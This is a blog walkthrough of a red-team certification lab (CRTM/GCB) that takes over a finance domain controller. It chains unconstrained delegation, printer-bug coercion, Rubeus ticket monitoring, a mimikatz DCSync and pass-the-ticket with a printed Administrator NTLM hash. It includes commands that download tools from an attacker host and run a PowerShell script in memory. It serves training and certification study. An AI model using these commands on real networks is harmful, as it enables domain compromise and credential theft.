CRTM Walkthrough Global Central Bank

This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity

Download as .zip Download as .tar.gz View on GitHub

finance-dc01.gcbfinance.local 192.168.42.1

In order to access to finance-dc01 itâ€™s possible perform an unconstrained delegation attack between the finance-vanessa and finance-dc01:

1. Copy binaries to finance-vanessa.gcbfinance.local and enumerate unconstrained delagation:

[finance-vanessa.gcbfinance.local]: PS C:\> wget http://192.168.100.15:443/mimikatz.exe -OutFile C:\mimikatz.exe
[finance-vanessa.gcbfinance.local]: PS C:\> wget http://192.168.100.15:443/mimikatz.exe -OutFile C:\Rubeus.exe
[finance-vanessa.gcbfinance.local]: PS C:\> IEX (New-Object Net.Webclient).DownloadString("http://192.168.100.15:443/PowerView.ps1")

Detect unconstrained delegation:

[finance-vanessa.gcbfinance.local]: PS C:\> Get-DomainComputer -Unconstrained

2. Perform Unconstrained delegation attack and with MS-RPRN binary (Printer bug request):

Copy binary:

wget http://192.168.100.15:443/MS-RPRN.exe -OutFile C:\MS-RPRN.exe
[finance-vanessa.gcbfinance.local]: PS C:\> .\MS-RPRN.exe \\finance-dc01.gcbfinance.local \\finance-vanessa.gcbfinance.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!

Monitoring tgt request from finance-dc01.gcbfinance.local:

[finance-vanessa.gcbfinance.local]: PS C:\> .\Rubeus.exe monitor /targetuser:FINANCE-DC01$ /interval:5 /nowrap

3. Perform DCSync attack to gcbfinance.local domain controller

[finance-vanessa.gcbfinance.local]: PS C:\> C:\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:gcbfinance.local /user:Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

Bye!

5. Access to finance-dc01.gcbfinance.local with Domain Admin:

Impersonate Domain Administrator with rubeus:

C:\Rubeus.exe asktgt /domain:gcbfinance.local /user:Administrator /ntlm:0a85684be0b18236c2cfd9149ef76b02 /ptt
